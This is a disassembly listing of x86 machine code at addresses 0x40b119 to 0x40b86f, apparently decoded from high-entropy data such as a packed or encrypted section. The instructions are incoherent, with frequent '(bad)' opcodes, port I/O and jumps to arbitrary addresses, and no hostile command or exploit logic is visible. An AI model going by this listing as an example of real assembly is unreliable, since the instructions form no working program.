  40b119:	and    edi,DWORD PTR [edx+0x2e]
  40b11c:	pop    ss
  40b11d:	dec    esp
  40b11e:	xchg   ebp,eax
  40b11f:	sub    ebp,DWORD PTR [ebx]
  40b121:	dec    edi
  40b122:	mov    ds,WORD PTR [edx+0xc]
  40b125:	call   0x96c7429b
  40b12a:	add    bh,al
  40b12c:	inc    ebx
  40b12d:	aas    
  40b12e:	mov    ds:0xb73b6198,al
  40b133:	(bad)  
  40b134:	mov    BYTE PTR [eax],bh
  40b136:	ins    DWORD PTR es:[edi],dx
  40b137:	clc    
  40b138:	mov    bl,0xf4
  40b13a:	daa    
  40b13b:	jecxz  0x40b0c5
  40b13d:	lods   eax,DWORD PTR ds:[esi]
  40b13e:	sbb    DWORD PTR [ebx-0x67],esi
  40b141:	adc    BYTE PTR fs:[edi+0x58943dc8],ch
  40b148:	rcl    BYTE PTR [ecx-0x227528ac],cl
  40b14e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b14f:	or     ebx,DWORD PTR [edx+0x25010a55]
  40b155:	cmp    DWORD PTR [edx-0x1ce369d7],0x60727822
  40b15f:	pop    edi
  40b160:	xor    al,BYTE PTR [edi+0x25]
  40b163:	in     al,0x82
  40b165:	test   DWORD PTR [eax],ebp
  40b167:	mov    esi,ebx
  40b169:	adc    cl,BYTE PTR [edx+eiz*8+0x3f77397d]
  40b170:	adc    ch,BYTE PTR [ecx+eax*1]
  40b173:	push   es
  40b174:	inc    eax
  40b175:	sub    BYTE PTR [ecx-0x10],ch
  40b178:	mov    bl,0xdf
  40b17a:	sub    DWORD PTR [ebp-0x6dba30ce],0x2c94d3be
  40b184:	in     al,dx
  40b185:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b186:	fst    QWORD PTR [ebx+eiz*2]
  40b189:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b18a:	jno    0x40b153
  40b18c:	out    dx,eax
  40b18d:	dec    eax
  40b18e:	mov    cl,0xc8
  40b190:	and    al,0x1f
  40b192:	fnstenv [ebx-0x67433b0c]
  40b198:	in     al,dx
  40b199:	jae    0x40b204
  40b19b:	jmp    0x4177:0xb64c0bb8
  40b1a2:	mov    dh,0xa7
  40b1a4:	push   ebx
  40b1a5:	mov    ch,bh
  40b1a7:	xchg   BYTE PTR [edi+0x1b],ah
  40b1aa:	or     eax,0x563d1507
  40b1af:	aaa    
  40b1b0:	sub    al,0x30
  40b1b2:	add    al,0xc1
  40b1b4:	sbb    BYTE PTR [edi+edi*2-0xc],0xac
  40b1b9:	jp     0x40b21d
  40b1bb:	aas    
  40b1bc:	pushf  
  40b1bd:	mov    dh,0xf
  40b1bf:	or     ebp,DWORD PTR [edx-0x42fa4341]
  40b1c5:	aas    
  40b1c6:	and    DWORD PTR [edi],0xffffffe4
  40b1c9:	stos   BYTE PTR es:[edi],al
  40b1ca:	xor    ch,BYTE PTR [eax]
  40b1cc:	inc    esp
  40b1cd:	xchg   ebp,eax
  40b1ce:	and    bl,BYTE PTR ds:0x14a748f4
  40b1d4:	jno    0x40b1ce
  40b1d6:	jg     0x40b15e
  40b1d8:	xor    esp,DWORD PTR [ebx-0x1]
  40b1db:	jae    0x40b1cf
  40b1dd:	xor    ch,0xaa
  40b1e0:	js     0x40b1d0
  40b1e2:	mov    edi,gs
  40b1e4:	pushf  
  40b1e5:	ret    0x9462
  40b1e8:	xchg   edx,eax
  40b1e9:	mov    BYTE PTR [esi-0x65],ah
  40b1ec:	pop    ss
  40b1ed:	lods   al,BYTE PTR ds:[esi]
  40b1ee:	call   0x89c97ade
  40b1f3:	sub    edi,ecx
  40b1f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b1f6:	in     eax,dx
  40b1f7:	mov    ch,0x53
  40b1f9:	iret   
  40b1fa:	gs push es
  40b1fc:	fstp   QWORD PTR [edi+ebx*4]
  40b1ff:	scas   al,BYTE PTR es:[edi]
  40b200:	mov    ss,WORD PTR [ebx]
  40b202:	out    0x78,al
  40b204:	inc    ebp
  40b205:	mov    dl,0xa4
  40b207:	mov    ds:0x934d9cad,al
  40b20c:	std    
  40b20d:	cmp    esp,DWORD PTR [edi-0x5]
  40b210:	sbb    eax,0xb3c2ac17
  40b215:	push   edi
  40b216:	jl     0x40b1cf
  40b218:	xor    BYTE PTR [ecx-0x4044653e],0x4e
  40b21f:	sbb    al,dl
  40b221:	loop   0x40b21c
  40b223:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b224:	das    
  40b225:	mov    BYTE PTR ss:[ecx],ah
  40b228:	cmp    BYTE PTR [eax+eax*8-0x53],0x18
  40b22d:	enter  0x6ae9,0xaa
  40b231:	les    ebx,FWORD PTR [ebp-0x4f92daa1]
  40b237:	pop    ecx
  40b238:	stos   DWORD PTR es:[edi],eax
  40b239:	(bad)  
  40b23a:	pop    edx
  40b23b:	fwait
  40b23c:	mov    dl,0xfe
  40b23e:	dec    ebp
  40b23f:	push   0xffffffa9
  40b241:	mov    ebx,0xfc4ec760
  40b246:	jno    0x40b1f1
  40b248:	mov    al,0xa4
  40b24a:	mov    edx,DWORD PTR [eax-0x780941df]
  40b250:	imul   eax,edx,0xffffffcb
  40b253:	loope  0x40b1d5
  40b255:	sub    al,0x26
  40b257:	inc    ebx
  40b258:	fbld   TBYTE PTR [edi-0x28b96d70]
  40b25e:	push   eax
  40b25f:	add    dh,BYTE PTR [ebx]
  40b261:	or     DWORD PTR [ebx-0x522f0ba4],eax
  40b267:	je     0x40b285
  40b269:	loope  0x40b2a7
  40b26b:	jp     0x40b234
  40b26d:	das    
  40b26e:	cmp    DWORD PTR [ecx-0x53],esp
  40b271:	mov    ebp,0x605d7d3f
  40b276:	in     al,0xb9
  40b278:	ja     0x40b215
  40b27a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b27b:	addr16 sub eax,0xebaa15db
  40b281:	aad    0x65
  40b283:	add    DWORD PTR [ebx-0x12],ebx
  40b286:	mov    bl,BYTE PTR [ecx+0x27eaf5e6]
  40b28c:	adc    al,0xb
  40b28e:	lock mov ebp,0x3c6708c1
  40b294:	(bad)  
  40b295:	dec    edx
  40b296:	test   al,0xd
  40b298:	xchg   esi,eax
  40b299:	push   cs
  40b29a:	sub    eax,0xf308e301
  40b29f:	fwait
  40b2a0:	mov    ecx,0x35bb0438
  40b2a5:	aaa    
  40b2a6:	dec    esi
  40b2a7:	loop   0x40b22d
  40b2a9:	sti    
  40b2aa:	(bad)  
  40b2ab:	call   0x895aeb6a
  40b2b0:	aaa    
  40b2b1:	and    ebx,DWORD PTR [esp+ebx*2]
  40b2b4:	in     eax,dx
  40b2b5:	push   esi
  40b2b6:	cld    
  40b2b7:	(bad)  
  40b2b8:	(bad)  
  40b2b9:	mov    al,ds:0xbd146784
  40b2be:	push   edx
  40b2bf:	or     DWORD PTR [ebx-0x18],0xffffff84
  40b2c3:	mov    ebp,0xbd40ec79
  40b2c8:	aad    0xce
  40b2ca:	in     eax,0xa3
  40b2cc:	and    eax,0x3ac7d0e8
  40b2d1:	scas   eax,DWORD PTR es:[edi]
  40b2d2:	call   0x7376de6a
  40b2d7:	push   edx
  40b2d8:	add    esi,DWORD PTR [ebx-0x11eaad46]
  40b2de:	jp     0x40b322
  40b2e0:	adc    bh,BYTE PTR [edx]
  40b2e2:	mov    edx,0xb1993c7c
  40b2e7:	adc    BYTE PTR [ebx-0x48],bl
  40b2ea:	mov    al,0xd1
  40b2ec:	cmp    BYTE PTR [esp+ecx*1-0xdab2301],ah
  40b2f3:	jmp    0x40b35a
  40b2f5:	xchg   ebx,esi
  40b2f7:	fst    st(0)
  40b2f9:	mov    eax,0xc09f3f55
  40b2fe:	jl     0x40b2f7
  40b300:	inc    edi
  40b301:	mov    eax,0xe96831d9
  40b306:	cwde   
  40b307:	pop    edi
  40b308:	loope  0x40b2fd
  40b30a:	or     dl,BYTE PTR [edx+ebx*2+0x7bf5d545]
  40b311:	mov    al,0x47
  40b313:	and    al,0x7
  40b315:	xchg   esi,eax
  40b316:	stos   DWORD PTR es:[edi],eax
  40b317:	sub    ch,BYTE PTR [ecx]
  40b319:	sub    al,BYTE PTR [ebx-0x30]
  40b31c:	ret    
  40b31d:	mov    cl,dl
  40b31f:	rol    DWORD PTR [edi],1
  40b321:	jns    0x40b313
  40b323:	aam    0x3b
  40b325:	dec    ebp
  40b326:	dec    ecx
  40b327:	or     ebp,edx
  40b329:	ficomp WORD PTR [ebx+0x4ed6d2af]
  40b32f:	xchg   edi,eax
  40b330:	arpl   WORD PTR [ecx+ecx*8],dx
  40b333:	gs pop ds
  40b335:	xor    BYTE PTR [ebx*8-0x33996589],dh
  40b33c:	jno    0x40b347
  40b33e:	push   esp
  40b33f:	push   eax
  40b340:	dec    esp
  40b341:	jle    0x40b388
  40b343:	xor    eax,0x90ad9ef7
  40b348:	fstp   QWORD PTR [edx-0x1]
  40b34b:	leave  
  40b34c:	jbe    0x40b341
  40b34e:	sub    eax,0xfb0e78a9
  40b353:	adc    BYTE PTR [ecx-0x76903ae5],dh
  40b359:	psllw  mm5,mm6
  40b35c:	ja     0x40b34e
  40b35e:	sar    DWORD PTR [ecx-0x7d],cl
  40b361:	adc    eax,0xaa6c9929
  40b366:	inc    esp
  40b367:	push   ebp
  40b368:	add    al,0xcf
  40b36a:	test   al,0x2a
  40b36c:	std    
  40b36d:	inc    eax
  40b36e:	fwait
  40b36f:	sbb    eax,0x9f45e0fa
  40b374:	dec    esp
  40b375:	imul   ebp,edx,0x11
  40b378:	test   BYTE PTR [edx],bh
  40b37a:	push   edi
  40b37b:	fdivr  DWORD PTR ss:[esi+0x68]
  40b37f:	mov    eax,0xb378336
  40b384:	jle    0x40b319
  40b386:	loop   0x40b329
  40b388:	ss pop ecx
  40b38a:	xchg   esi,eax
  40b38b:	mov    eax,0x885cfcde
  40b390:	xchg   esi,eax
  40b391:	jo     0x40b3d6
  40b393:	cmp    al,0x35
  40b395:	xchg   ebp,eax
  40b396:	sahf   
  40b397:	push   edx
  40b398:	xor    ebp,esi
  40b39a:	push   edi
  40b39b:	lods   al,BYTE PTR ds:[esi]
  40b39c:	xchg   ecx,eax
  40b39d:	xor    ebp,esi
  40b39f:	aad    0x9b
  40b3a1:	or     al,0x8a
  40b3a3:	(bad)
  40b3a6:	aam    0xca
  40b3a8:	in     eax,dx
  40b3a9:	pop    ss
  40b3aa:	jne    0x40b364
  40b3ac:	mov    ds:0xd3455021,eax
  40b3b1:	shl    DWORD PTR [edx+eax*2+0x1acf2cbf],cl
  40b3b8:	es enter 0x89e1,0x54
  40b3bd:	mov    esi,0xab2c3d50
  40b3c2:	jmp    FWORD PTR [ecx+0x1dd455ed]
  40b3c8:	push   ebp
  40b3c9:	inc    esp
  40b3ca:	mov    WORD PTR [ebx],ss
  40b3cc:	inc    ebp
  40b3cd:	mov    dl,0x59
  40b3cf:	ror    DWORD PTR [ecx],0x2
  40b3d2:	dec    BYTE PTR [eax]
  40b3d4:	push   esi
  40b3d5:	(bad)  
  40b3d6:	xor    DWORD PTR [edx],esi
  40b3d8:	fiadd  WORD PTR [ebx-0x28]
  40b3db:	in     al,dx
  40b3dc:	push   cs
  40b3dd:	mov    BYTE PTR [eax+0x742d3702],bh
  40b3e3:	test   eax,0xa39e0388
  40b3e8:	shr    BYTE PTR [ecx+0x6d1910b1],0x2a
  40b3ef:	je     0x40b423
  40b3f1:	neg    BYTE PTR [eax+0x0]
  40b3f4:	repnz mov al,0x76
  40b3f7:	ret    0x1274
  40b3fa:	and    esp,edi
  40b3fc:	pop    ecx
  40b3fd:	dec    edx
  40b3fe:	and    BYTE PTR [eax-0x6a2a5e9e],0xe8
  40b405:	je     0x40b3e6
  40b407:	lock push ss
  40b409:	sbb    cl,BYTE PTR cs:[ebp+0x50bb8c93]
  40b410:	(bad)  
  40b411:	test   al,0xef
  40b413:	fs and al,0x53
  40b416:	xor    esi,DWORD PTR [eax+0x48]
  40b419:	mov    bh,0x8d
  40b41b:	into   
  40b41c:	jle    0x40b3ec
  40b41e:	xchg   ecx,eax
  40b41f:	cwde   
  40b420:	adc    DWORD PTR [edi+0x46],0xffffffab
  40b424:	js     0x40b436
  40b426:	in     al,dx
  40b427:	cmp    BYTE PTR [esi-0x6fb8fdf9],cl
  40b42d:	and    eax,0xb45404f3
  40b432:	sub    eax,DWORD PTR [ebp-0x2cda3655]
  40b438:	cmp    esi,DWORD PTR [eax-0x58]
  40b43b:	(bad)  
  40b43d:	or     bl,ah
  40b43f:	sbb    eax,0xcfbc3249
  40b444:	mov    ebp,0x9362e197
  40b449:	jecxz  0x40b401
  40b44b:	mov    ds:0x42e0553d,al
  40b450:	bound  ebx,QWORD PTR [edi-0x1d7bbd79]
  40b456:	sti    
  40b457:	xlat   BYTE PTR ds:[ebx]
  40b458:	push   ebp
  40b459:	mov    dl,0xba
  40b45b:	cmp    al,0xac
  40b45d:	sbb    ebp,ebp
  40b45f:	(bad)  
  40b460:	jno    0x40b453
  40b462:	pop    es
  40b463:	int    0x35
  40b465:	or     al,0xf4
  40b467:	dec    esi
  40b468:	xchg   ebx,eax
  40b469:	(bad)  
  40b46a:	aas    
  40b46b:	mov    esi,0x203b098b
  40b470:	cwde   
  40b471:	jge    0x40b478
  40b473:	pop    ss
  40b474:	or     BYTE PTR [esi+0x6e],bh
  40b477:	jmp    0x40b42d
  40b479:	mov    es,WORD PTR [edi-0x6af13838]
  40b47f:	dec    ecx
  40b480:	xchg   edi,eax
  40b481:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b482:	cmc    
  40b483:	fnstenv [ecx-0x2d]
  40b486:	jmp    0x40b4ac
  40b488:	xchg   ebx,eax
  40b489:	(bad)  
  40b48a:	pop    esp
  40b48b:	cdq    
  40b48c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b48d:	sbb    al,0x40
  40b48f:	test   DWORD PTR [ecx+0x40ee3e12],edi
  40b495:	lods   eax,DWORD PTR ds:[esi]
  40b496:	aaa    
  40b497:	sub    al,0xd0
  40b499:	mov    edx,0xe5b1ec1d
  40b49e:	cwde   
  40b49f:	dec    edx
  40b4a0:	mov    eax,ds:0x9c157d8a
  40b4a5:	xor    ecx,esp
  40b4a7:	mov    WORD PTR [ecx-0x36],?
  40b4aa:	fld    DWORD PTR gs:[esi-0x2a]
  40b4ae:	or     BYTE PTR [edi],cl
  40b4b0:	pop    eax
  40b4b1:	dec    ebp
  40b4b2:	test   al,0x7e
  40b4b4:	loope  0x40b51b
  40b4b6:	(bad)  
  40b4b7:	jns    0x40b4e9
  40b4b9:	pop    ebx
  40b4ba:	push   ebp
  40b4bb:	aaa    
  40b4bc:	stc    
  40b4bd:	(bad)  
  40b4be:	push   ecx
  40b4bf:	jb     0x40b476
  40b4c1:	fdivr  QWORD PTR [esi+eiz*2+0x52]
  40b4c5:	cmc    
  40b4c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b4c7:	xchg   ecx,eax
  40b4c8:	cmp    al,0x3
  40b4ca:	aam    0xf6
  40b4cc:	xchg   edx,eax
  40b4cd:	inc    ebx
  40b4ce:	and    BYTE PTR [ecx-0x50],dl
  40b4d1:	stc    
  40b4d2:	adc    bl,BYTE PTR [ecx+eiz*4+0x2f3604e2]
  40b4d9:	pop    eax
  40b4da:	ret    
  40b4db:	mov    DWORD PTR [esi+0x54],edi
  40b4de:	mov    edx,DWORD PTR ds:0x6b510e01
  40b4e4:	push   0xbfa460e1
  40b4e9:	sbb    DWORD PTR [esi],ebx
  40b4eb:	add    eax,0xcd1f6580
  40b4f0:	mov    ebx,0x6ae5f7c2
  40b4f5:	ret    
  40b4f6:	adc    DWORD PTR [ebx],edi
  40b4f8:	mov    ebp,0x223f39d0
  40b4fd:	cdq    
  40b4fe:	jo     0x40b49b
  40b500:	add    BYTE PTR [esi+0x17a3856d],dh
  40b506:	xor    bh,BYTE PTR [edi]
  40b508:	mov    WORD PTR [ecx],ss
  40b50a:	pushf  
  40b50b:	jns    0x40b54b
  40b50d:	jmp    0x668f:0x68c298a3
  40b514:	(bad)  
  40b515:	lock loopne 0x40b52c
  40b518:	in     eax,0x54
  40b51a:	add    al,0x90
  40b51c:	adc    ah,bl
  40b51e:	in     eax,0xf6
  40b520:	mov    al,ds:0xd10b6900
  40b525:	or     eax,0x33bb0f56
  40b52a:	jns    0x40b4eb
  40b52c:	jnp    0x40b583
  40b52e:	sub    BYTE PTR [ecx],ch
  40b530:	adc    DWORD PTR [eax],esi
  40b532:	(bad)  
  40b533:	jle    0x40b4b6
  40b535:	bound  ebp,QWORD PTR [eax+0x4ff2faa8]
  40b53b:	mov    al,0xf8
  40b53d:	stos   BYTE PTR es:[edi],al
  40b53e:	fwait
  40b53f:	inc    DWORD PTR [edi]
  40b541:	mov    BYTE PTR [ecx],ch
  40b543:	scas   eax,DWORD PTR es:[edi]
  40b544:	mov    dl,0xcc
  40b546:	out    0xfa,eax
  40b548:	movss  DWORD PTR [eax+0x27],xmm3
  40b54d:	pop    esi
  40b54e:	xchg   DWORD PTR [esi+edi*4+0x4b20e18e],edx
  40b555:	jl     0x40b584
  40b557:	mov    ecx,0x58887d74
  40b55c:	scas   al,BYTE PTR es:[edi]
  40b55d:	xchg   ebp,eax
  40b55e:	sub    ch,BYTE PTR [ebx-0x10]
  40b561:	(bad)  
  40b562:	jo     0x40b569
  40b564:	imul   ebx,DWORD PTR [esi-0x7e5346c7],0xe728b976
  40b56e:	push   cs
  40b56f:	or     ch,dl
  40b571:	(bad)  
  40b572:	or     dl,BYTE PTR [eax+0x763c1b45]
  40b578:	scas   al,BYTE PTR es:[edi]
  40b579:	pop    ds
  40b57a:	ins    DWORD PTR es:[edi],dx
  40b57b:	jg     0x40b57b
  40b57d:	(bad)  [esi+0x50366e31]
  40b583:	stc    
  40b584:	fdivrp st(6),st
  40b586:	call   0x70984b24
  40b58b:	mov    al,ds:0xd9f8714b
  40b590:	std    
  40b591:	fwait
  40b592:	aad    0xb8
  40b594:	lahf   
  40b595:	mov    esi,0x25ed76f1
  40b59a:	lahf   
  40b59b:	jl     0x40b58b
  40b59d:	and    BYTE PTR [ecx+0x2a],ah
  40b5a0:	sbb    eax,0xdb9211bf
  40b5a5:	xor    al,0xd3
  40b5a7:	jae    0x40b58b
  40b5a9:	xor    edi,DWORD PTR [esi+0x41]
  40b5ac:	or     DWORD PTR [esi],esp
  40b5ae:	xlat   BYTE PTR ds:[ebx]
  40b5af:	inc    ecx
  40b5b0:	sahf   
  40b5b1:	pop    es
  40b5b2:	in     al,dx
  40b5b3:	dec    edi
  40b5b4:	jmp    0xe2685120
  40b5b9:	jecxz  0x40b638
  40b5bb:	push   es
  40b5bc:	xor    esp,DWORD PTR [ebx+0x67f4db2c]
  40b5c2:	mov    ds:0x26aa1890,al
  40b5c7:	inc    ecx
  40b5c9:	adc    DWORD PTR [edi],ebp
  40b5cb:	rcr    BYTE PTR [esp+esi*1+0x0],0xc2
  40b5d0:	lds    esp,FWORD PTR [ecx-0x41]
  40b5d3:	cmp    bh,bh
  40b5d5:	and    DWORD PTR [edi+0x55ef0d],0x78
  40b5dc:	dec    edx
  40b5dd:	sub    DWORD PTR [eax-0x57f0e4fc],ecx
  40b5e3:	aaa    
  40b5e4:	jmp    0x40b588
  40b5e6:	cmp    esp,eax
  40b5e8:	push   edi
  40b5e9:	(bad)  
  40b5ea:	xchg   edi,eax
  40b5eb:	and    BYTE PTR ds:0x68c4bbc,0xf9
  40b5f2:	std    
  40b5f3:	push   eax
  40b5f4:	mov    edi,0x54c07995
  40b5f9:	xchg   esp,eax
  40b5fa:	addr16 mov eax,0x2b756f5d
  40b600:	inc    esp
  40b601:	xchg   ch,cl
  40b603:	pop    ecx
  40b604:	into   
  40b605:	push   cs
  40b606:	mov    ebp,0xc673c796
  40b60b:	vpcmpgtw ymm4,ymm7,ymm7
  40b60f:	nop
  40b610:	or     ebx,DWORD PTR [eax-0x5b]
  40b613:	sahf   
  40b614:	push   ds
  40b615:	sbb    ch,bl
  40b617:	mov    edx,DWORD PTR [eax+0x3c]
  40b61a:	jns    0x40b5af
  40b61c:	in     al,dx
  40b61d:	cli    
  40b61e:	scas   eax,DWORD PTR es:[edi]
  40b61f:	pop    ecx
  40b620:	mov    bl,0xef
  40b622:	xor    eax,0x660b3eb0
  40b627:	xchg   esi,edx
  40b629:	ret    
  40b62a:	adc    BYTE PTR [esi+0x79152948],al
  40b630:	xlat   BYTE PTR ds:[ebx]
  40b631:	pop    esp
  40b632:	pop    edi
  40b633:	jle    0x40b5b9
  40b635:	dec    ebx
  40b636:	fisub  WORD PTR [eax+0x52051987]
  40b63c:	(bad)  
  40b63d:	rol    cl,1
  40b63f:	jno    0x40b6b8
  40b641:	hlt    
  40b642:	in     eax,0xfc
  40b644:	stos   BYTE PTR es:[edi],al
  40b645:	test   dl,cl
  40b647:	pop    es
  40b648:	inc    eax
  40b649:	loop   0x40b5db
  40b64b:	add    DWORD PTR [ebx+0x6ffc5b11],esi
  40b651:	dec    eax
  40b652:	mul    dl
  40b654:	xchg   BYTE PTR [esi+0x314dbd05],ch
  40b65a:	loop   0x40b688
  40b65c:	mov    bl,BYTE PTR [ecx+0x59]
  40b65f:	test   BYTE PTR [ebx+0x43685b01],0xff
  40b666:	jae    0x40b6bc
  40b668:	push   es
  40b669:	sbb    dh,BYTE PTR [edx]
  40b66b:	retf   0x3f6
  40b66e:	pop    ecx
  40b66f:	stc    
  40b670:	adc    eax,0x7b4d90ed
  40b675:	hlt    
  40b676:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b677:	loop   0x40b67f
  40b679:	pop    ebp
  40b67a:	popa   
  40b67b:	inc    ebp
  40b67c:	(bad)  
  40b67d:	mov    esi,0x9e386456
  40b682:	mov    esi,0xdb5ad2e
  40b687:	lods   eax,DWORD PTR ds:[esi]
  40b688:	sar    ecx,cl
  40b68a:	test   al,0x6b
  40b68c:	popa   
  40b68d:	sahf   
  40b68e:	push   es
  40b68f:	jp     0x40b627
  40b691:	jmp    0x678a72bd
  40b696:	cwde   
  40b697:	lea    ebp,[edx-0x7c8f61fa]
  40b69d:	sbb    BYTE PTR [ecx-0x28],ch
  40b6a0:	xor    DWORD PTR [edx],ecx
  40b6a2:	stos   BYTE PTR es:[edi],al
  40b6a3:	sbb    eax,0x7e4e8ac
  40b6a8:	mov    esi,DWORD PTR [edi+edi*1-0x4c]
  40b6ac:	adc    BYTE PTR [ecx],bl
  40b6ae:	test   BYTE PTR gs:[ebp+0x537d6028],al
  40b6b5:	and    DWORD PTR [ecx+0x55],ebp
  40b6b8:	int    0x18
  40b6ba:	mov    eax,ds:0xa5e4d786
  40b6bf:	in     al,0xf8
  40b6c1:	mov    ch,0x7b
  40b6c3:	adc    DWORD PTR [eiz*8-0x22ad9c7b],edi
  40b6ca:	push   DWORD PTR [eax-0x7c]
  40b6cd:	inc    eax
  40b6ce:	outs   dx,DWORD PTR ds:[esi]
  40b6cf:	js     0x40b680
  40b6d1:	xor    al,0xc4
  40b6d3:	rcl    BYTE PTR [eax],0x2
  40b6d6:	ss aas 
  40b6d8:	lahf   
  40b6d9:	imul   BYTE PTR [eax-0x77]
  40b6dc:	and    ebx,DWORD PTR [eax]
  40b6de:	stos   DWORD PTR es:[edi],eax
  40b6df:	bnd jle 0x40b6a4
  40b6e2:	clc    
  40b6e3:	clc    
  40b6e4:	cmp    al,0xf5
  40b6e6:	std    
  40b6e7:	xchg   BYTE PTR [esi],al
  40b6e9:	adc    BYTE PTR [edi+0x4f],bl
  40b6ec:	mov    al,0x20
  40b6ee:	sbb    edx,DWORD PTR [eax+0xb]
  40b6f1:	mov    ds:0x48b71f4f,eax
  40b6f6:	push   ecx
  40b6f7:	add    DWORD PTR [ebp-0x304d8175],esi
  40b6fd:	test   al,0xc4
  40b6ff:	xor    dl,BYTE PTR [ecx-0x26826c4]
  40b705:	or     ah,BYTE PTR [ebp-0xfaafb5e]
  40b70b:	push   eax
  40b70c:	imul   ebx,DWORD PTR [ebx-0x4b],0x27
  40b710:	clc    
  40b711:	leave  
  40b712:	iret   
  40b713:	popf   
  40b714:	popa   
  40b715:	lods   eax,DWORD PTR ds:[esi]
  40b716:	int3   
  40b717:	shl    BYTE PTR [ebx+edi*1+0x4],1
  40b71b:	out    dx,eax
  40b71c:	stc    
  40b71d:	aaa    
  40b71e:	(bad)  
  40b720:	ret    0xb7e
  40b723:	cmp    eax,0x8f06384b
  40b728:	pop    esp
  40b729:	and    esp,DWORD PTR [edx+edx*4+0x85c6119]
  40b730:	out    dx,al
  40b731:	sub    al,0xda
  40b733:	xlat   BYTE PTR ds:[ebx]
  40b734:	in     eax,0xc2
  40b736:	les    ebx,FWORD PTR [ebx-0x7a]
  40b739:	xchg   esp,eax
  40b73a:	call   0x3cee:0xf31cffb8
  40b741:	and    ebp,ecx
  40b743:	and    BYTE PTR [eax],bh
  40b745:	adc    al,0xee
  40b747:	mov    dl,0xc1
  40b749:	jecxz  0x40b79e
  40b74b:	dec    eax
  40b74c:	test   al,0x40
  40b74e:	mov    esp,0x54a50526
  40b753:	inc    ebx
  40b754:	push   cs
  40b755:	jne    0x40b749
  40b757:	xchg   ebp,eax
  40b758:	pop    edx
  40b759:	mov    ds:0x8de2a229,eax
  40b75e:	lahf   
  40b75f:	in     al,0x90
  40b761:	shl    ah,1
  40b763:	leave  
  40b764:	retf   0x56ab
  40b767:	shl    DWORD PTR [ebp+0x32],1
  40b76a:	or     edx,DWORD PTR [edx+0x7cec444e]
  40b770:	outs   dx,BYTE PTR ds:[esi]
  40b771:	mov    ebp,0xb2c0316c
  40b776:	jne    0x40b7f4
  40b778:	inc    eax
  40b77a:	repnz cwde 
  40b77c:	inc    edi
  40b77d:	pop    ebx
  40b77e:	loope  0x40b7c1
  40b780:	rol    BYTE PTR [ebx-0x3b],cl
  40b783:	adc    al,ah
  40b785:	xor    ebx,0x65
  40b788:	dec    edx
  40b789:	test   DWORD PTR [ecx],esi
  40b78b:	mov    DWORD PTR [edx-0x68c693d9],ebx
  40b791:	daa    
  40b792:	(bad)  
  40b793:	in     eax,0x28
  40b795:	retf   
  40b796:	(bad)  
  40b797:	jne    0x40b7f8
  40b799:	cli    
  40b79a:	fild   WORD PTR [ecx+ebx*8+0x2c26f662]
  40b7a1:	xor    DWORD PTR ds:0x6f750edd,ebp
  40b7a7:	out    dx,eax
  40b7a8:	inc    eax
  40b7a9:	mov    ds:0x6c1cb8e1,eax
  40b7ae:	lods   eax,DWORD PTR ds:[esi]
  40b7af:	push   ss
  40b7b0:	jne    0x40b735
  40b7b2:	mov    dl,0x95
  40b7b4:	scas   al,BYTE PTR es:[edi]
  40b7b5:	dec    ecx
  40b7b6:	repz in eax,0x80
  40b7b9:	(bad)  
  40b7ba:	call   0xd4fd2d83
  40b7bf:	xor    cl,cl
  40b7c1:	pop    es
  40b7c2:	adc    DWORD PTR [ebx-0x27],ecx
  40b7c5:	ret    
  40b7c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b7c7:	pop    es
  40b7c8:	and    eax,0x7a5361d8
  40b7cd:	imul   ecx,DWORD PTR [edi-0x4ad075d4],0x22
  40b7d4:	dec    edi
  40b7d5:	hlt    
  40b7d6:	dec    ebx
  40b7d7:	cdq    
  40b7d8:	lahf   
  40b7d9:	in     eax,0xde
  40b7db:	dec    esp
  40b7dc:	jecxz  0x40b84d
  40b7de:	xor    BYTE PTR [edi+0x6d],ah
  40b7e1:	outs   dx,DWORD PTR ds:[esi]
  40b7e2:	lock mov ebp,0x3cfd9f9
  40b7e8:	adc    BYTE PTR [ebx-0x3e477b40],bl
  40b7ee:	mov    dh,ch
  40b7f0:	test   eax,0x4f800c9e
  40b7f5:	adc    al,0xb2
  40b7f7:	test   eax,0xa68ecfe3
  40b7fc:	int    0x2c
  40b7fe:	pushf  
  40b7ff:	or     ch,BYTE PTR [ebx+0x24fef361]
  40b805:	sbb    cl,al
  40b807:	push   esi
  40b808:	dec    ecx
  40b809:	cmp    esi,edx
  40b80b:	stos   BYTE PTR es:[edi],al
  40b80c:	adc    eax,0xd479bb3f
  40b811:	ins    BYTE PTR es:[edi],dx
  40b812:	and    DWORD PTR [ebx],eax
  40b814:	pop    edx
  40b815:	pop    eax
  40b816:	loopne 0x40b7a0
  40b818:	psrad  mm1,QWORD PTR [esi+0x5ec6bd9d]
  40b81f:	call   0x8cca:0xe8524ccc
  40b826:	pop    eax
  40b827:	sub    eax,0x4fc05cb9
  40b82c:	(bad)  
  40b82d:	fadd   st,st(2)
  40b82f:	or     al,0xe4
  40b831:	add    BYTE PTR [edi-0x78394742],0x2
  40b838:	repz mov ds,esi
  40b83b:	lods   eax,DWORD PTR ds:[esi]
  40b83c:	sbb    cl,BYTE PTR [eax-0x3b6534a9]
  40b842:	outs   dx,DWORD PTR ds:[esi]
  40b843:	scas   eax,DWORD PTR es:[edi]
  40b844:	int    0xc3
  40b846:	pop    esi
  40b847:	nop
  40b848:	aad    0xd6
  40b84a:	push   edi
  40b84b:	sbb    DWORD PTR [esi],eax
  40b84d:	jmp    0x920af550
  40b852:	push   es
  40b853:	adc    eax,0x5922ad10
  40b858:	mov    esp,0xe9b49db6
  40b85d:	xor    BYTE PTR [ebp+0x1a],ch
  40b860:	jmp    0x40b8df
  40b862:	pop    ebp
  40b863:	jno    0x40b7eb
  40b865:	mov    bh,0x17
  40b867:	(bad)  
  40b868:	(bad)  
  40b869:	adc    esi,DWORD PTR [edi]
  40b86b:	xlat   BYTE PTR ds:[ebx]
  40b86c:	out    dx,al
  40b86d:	std    
  40b86e:	outs   dx,DWORD PTR ds:[esi]
  40b86f:	fwait
